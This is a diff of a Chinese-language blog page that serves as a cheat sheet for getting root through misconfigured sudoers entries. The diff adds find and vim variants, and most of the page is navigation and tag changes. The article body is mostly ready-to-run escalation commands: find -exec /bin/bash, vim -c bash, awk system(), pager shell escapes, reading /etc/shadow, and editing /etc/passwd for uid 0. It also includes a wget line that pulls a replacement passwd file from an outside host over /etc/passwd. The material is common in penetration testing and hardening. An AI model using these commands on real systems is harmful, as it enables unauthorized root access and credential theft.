@@ -8,18 +8,18 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>sudoers_get_root_cheatsheet | owefsad&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="简介sudo用于提升权限到指定用户并执行对应的命令, 在企业生产环境中, sudoers的错误配置到处可见, 本文持续收集可通过sudo提权的指令集合.">
+  <meta name="description" content="简介sudo用于提升权限到指定用户并执行对应的命令, 在企业生产环境中, sudoers的错误配置到处可见, 本文持续收集可通过sudo提权的指令集合. ps://由于系统文件或开源软件的sudoers配置错误的利用方式较成熟, 因此很多linux系统已经进行相应的内核级限制, 无法直接用于提权, 此时需要开启脑洞实现提权.">
 <meta name="keywords" content="sudoers,cheatsheet">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sudoers_get_root_cheatsheet">
 <meta property="og:url" content="http://yoursite.com/2019/03/26/sudoers-get-root-cheatsheet/index.html">
 <meta property="og:site_name" content="owefsad&#39;s blog">
-<meta property="og:description" content="简介sudo用于提升权限到指定用户并执行对应的命令, 在企业生产环境中, sudoers的错误配置到处可见, 本文持续收集可通过sudo提权的指令集合.">
+<meta property="og:description" content="简介sudo用于提升权限到指定用户并执行对应的命令, 在企业生产环境中, sudoers的错误配置到处可见, 本文持续收集可通过sudo提权的指令集合. ps://由于系统文件或开源软件的sudoers配置错误的利用方式较成熟, 因此很多linux系统已经进行相应的内核级限制, 无法直接用于提权, 此时需要开启脑洞实现提权.">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-03-26T05:12:57.077Z">
+<meta property="og:updated_time" content="2019-04-08T06:26:57.678Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sudoers_get_root_cheatsheet">
-<meta name="twitter:description" content="简介sudo用于提升权限到指定用户并执行对应的命令, 在企业生产环境中, sudoers的错误配置到处可见, 本文持续收集可通过sudo提权的指令集合.">
+<meta name="twitter:description" content="简介sudo用于提升权限到指定用户并执行对应的命令, 在企业生产环境中, sudoers的错误配置到处可见, 本文持续收集可通过sudo提权的指令集合. ps://由于系统文件或开源软件的sudoers配置错误的利用方式较成熟, 因此很多linux系统已经进行相应的内核级限制, 无法直接用于提权, 此时需要开启脑洞实现提权.">
   
     <link rel="alternative" href="/atom.xml" title="owefsad&#39;s blog" type="application/atom+xml">
   
@@ -60,11 +60,17 @@
 			
 				<li><a href="/">home</a></li>
 	        
+				<li><a href="/categories/思路">thought</a></li>
+	        
+				<li><a href="/categories/" cve="" analysys""="">cve analysys</a></li>
+	        
 				<li><a href="/categories/ctf">ctf</a></li>
 	        
 				<li><a href="/categories/tools">tools</a></li>
 	        
 				<li><a href="/categories/coding">coding</a></li>
+	        
+				<li><a href="/categories/prevention">prevention</a></li>
 	        
 				<li><a href="/categories/hexo">hexo</a></li>
 	        
@@ -128,6 +134,12 @@
 			
 				
 			
+				
+			
+				
+			
+				
+			
 			
 			
 			<nav class="header-nav">
@@ -146,15 +158,21 @@
 				<ul style="width: 70%">
 				
 				
-					<li style="width: 20%"><a href="/">home</a></li>
+					<li style="width: 12.5%"><a href="/">home</a></li>
 		        
-					<li style="width: 20%"><a href="/categories/ctf">ctf</a></li>
+					<li style="width: 12.5%"><a href="/categories/思路">thought</a></li>
 		        
-					<li style="width: 20%"><a href="/categories/tools">tools</a></li>
+					<li style="width: 12.5%"><a href="/categories/" cve="" analysys""="">cve analysys</a></li>
 		        
-					<li style="width: 20%"><a href="/categories/coding">coding</a></li>
+					<li style="width: 12.5%"><a href="/categories/ctf">ctf</a></li>
 		        
-					<li style="width: 20%"><a href="/categories/hexo">hexo</a></li>
+					<li style="width: 12.5%"><a href="/categories/tools">tools</a></li>
+		        
+					<li style="width: 12.5%"><a href="/categories/coding">coding</a></li>
+		        
+					<li style="width: 12.5%"><a href="/categories/prevention">prevention</a></li>
+		        
+					<li style="width: 12.5%"><a href="/categories/hexo">hexo</a></li>
 		        
 				</ul>
 			</nav>
@@ -189,7 +207,8 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>简介<br>sudo用于提升权限到指定用户并执行对应的命令, 在企业生产环境中, sudoers的错误配置到处可见, 本文持续收集可通过sudo提权的指令集合.<br><a id="more"></a></p>
+        <p>简介<br>sudo用于提升权限到指定用户并执行对应的命令, 在企业生产环境中, sudoers的错误配置到处可见, 本文持续收集可通过sudo提权的指令集合.</p>
+<p>ps://由于系统文件或开源软件的sudoers配置错误的利用方式较成熟, 因此很多linux系统已经进行相应的内核级限制, 无法直接用于提权, 此时需要开启脑洞实现提权.<br><a id="more"></a></p>
 <h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><ul>
 <li>Whit is Sudo?</li>
 <li>sudo提权</li>
@@ -199,7 +218,6 @@
 <p><code>sudo -l</code>的结果如下:<br>sudoers配置的内容包括: 命令、用户、用户组、密码四块内容, 本文仅展示最简单的几种:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 无 sudo 权限</span></span><br><span class="line">对不起，用户 execute 不能在 archlinux 上运行 sudo。</span><br><span class="line"></span><br><span class="line"><span class="comment"># root的 sudo权限: sudo执行不需要密码, 且以root权限运行/bin/cat命令</span></span><br><span class="line">(root) NOPASSWD: /bin/cat</span><br><span class="line"><span class="comment"># 运行sudo命令</span></span><br><span class="line">$ sudo /bin/cat /etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># storm的 sudo权限: sudo执行需要密码, 且以storm权限执行</span></span><br><span class="line">(storm) /bin/cat</span><br><span class="line"><span class="comment"># 运行sudo命令式需要添加-u指定用户</span></span><br><span class="line">$ sudo -u storm /bin/cat /etc/shadow</span><br></pre></td></tr></table></figure></p>
 <h2 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h2><p>错误的配置<code>/etc/suduers</code>文件可导致提权, 此处记录可利用<code>sudoers</code>错误配置进行提权的命令.</p>
 <ul>
-<li>echo</li>
 <li>find</li>
 <li>nano</li>
 <li>vi/vim</li>
@@ -215,10 +233,14 @@
 <li>pip</li>
 <li>zip</li>
 </ul>
-<h4 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h4><p>echo用来输出信息到标准输出, 通过重定向符可产生众多黑科技, 此处以创建一个新的root用户为例.</p>
-<h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo find /etc/passwd -<span class="built_in">exec</span> /bin/bash \;</span><br></pre></td></tr></table></figure>
+<h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>成熟的利用方法:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo find /etc/passwd -<span class="built_in">exec</span> /bin/bash \;</span><br></pre></td></tr></table></figure></p>
+<p>(find_escalate_root)[find.png]</p>
+<p>有些linux系统的find命令虽然设置了suid标志位却无法通过上述方法进行提权, 此时需要考虑用别的方法来进行提权, 如:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ find /etc/shadow -<span class="built_in">exec</span> cat /etc/shadow \;</span><br></pre></td></tr></table></figure></p>
+<p>(with_suid_escalate_root)[find_suid.png]</p>
 <h4 id="nano"><a href="#nano" class="headerlink" title="nano"></a>nano</h4><p>nano修改文件导致提权的方法很多, 此处以修改<code>/etc/passwd</code>中当前用户的<code>uid</code>、<code>gid</code>值来实现提权.<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用nano编辑/etc/passwd文件</span></span><br><span class="line">$ sudo nano /etc/passwd</span><br><span class="line"><span class="comment"># 修改当前账号的uid、gid均为0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用su命令重新切换到当前账号, 即可进入root账号</span></span><br><span class="line">$ su execute</span><br></pre></td></tr></table></figure></p>
-<h4 id="vi-vim"><a href="#vi-vim" class="headerlink" title="vi/vim"></a>vi/vim</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -c: 加载第一个文件后执行 -c参数后的命令</span></span><br><span class="line">$ sudo vim -c <span class="string">"/bin/bash"</span></span><br></pre></td></tr></table></figure>
+<h4 id="vi-vim"><a href="#vi-vim" class="headerlink" title="vi/vim"></a>vi/vim</h4><p>vim运行bash命令提权<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -c: 加载第一个文件后执行 -c参数后的命令</span></span><br><span class="line">$ sudo vim -c <span class="string">"/bin/bash"</span></span><br></pre></td></tr></table></figure></p>
+<p><a href="with_vim_sudoers_escalate_root.png">with_vim_sudoers_escalate_root</a></p>
+<p>有些linux系统的vim设置SUID位后, 无法用上述方法进行提权, 此时可通过vim命令修改<code>/etc/sudoers</code>文件, 增加当前用户的sudo权限实现提权, 也可以通过修改<code>/etc/passwd</code>文件中当前用户的id实现提权.<br>1.编辑<code>/etc/passwd</code>文件<br><a href="with_suid_vim_escalate_root_1.png">with_suid_vim_escalate_root_1</a><br><a href="with_suid_vim_escalate_root_2.png">with_suid_vim_escalate_root_2</a><br><a href="with_suid_vim_escalate_root_3.png">with_suid_vim_escalate_root_3</a><br>2.重新登陆系统获取root权限<br><a href="with_suid_vim_escalate_root_4.png">with_suid_vim_escalate_root_4</a></p>
 <h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo awk <span class="string">'BEGIN &#123;system("/bin/bash")&#125;'</span></span><br></pre></td></tr></table></figure>
 <h4 id="less-more-man"><a href="#less-more-man" class="headerlink" title="less/more/man"></a>less/more/man</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入man帮助页</span></span><br><span class="line">$ sudo man man</span><br><span class="line"><span class="comment"># 直接按下:"!sh"或"!/bin/bash", 键入回车实现越权或绕过rbash</span></span><br></pre></td></tr></table></figure>
 <h4 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h4><p>wget用于下载文件, 可指定保存文件位置, 设置了sudo权限的wget可通过覆盖文件实现提权, 此处以覆盖<code>/root/.ssh/</code>为例, 还可以覆盖<code>/etc/passwd</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载passwd文件覆盖/etc/passwd</span></span><br><span class="line">$ sudo wget http://172.16.88.130/passwd -O /etc/passwd</span><br><span class="line"><span class="comment"># 切换到passwd中的用户</span></span><br><span class="line">$ su hack</span><br></pre></td></tr></table></figure></p>
@@ -560,6 +582,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">csrf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">甲方</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">文件包含</a>
               </li>
              
@@ -572,23 +602,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">csrf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">甲方</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">open ssl</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">内存越界访问</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">url爆破</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -600,7 +618,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">hexo-beauty</a>
+                <a href="javascript:void(0)" class="js-tag color1">url爆破</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -612,11 +630,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">主机攻击思路</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">metaclass</a>
+                <a href="javascript:void(0)" class="js-tag color2">hexo-beauty</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -624,7 +638,35 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">主机攻击思路</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">cheatsheet</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">metaclass</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">暴力破解</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">hydra</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">设计模式</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">工厂模式</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">单例模式</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -641,26 +683,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">tcpdump提权</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">设计模式</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">工厂模式</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">暴力破解</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">hydra</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">单例模式</a>
               </li>
             
             <div class="clearfix"></div>
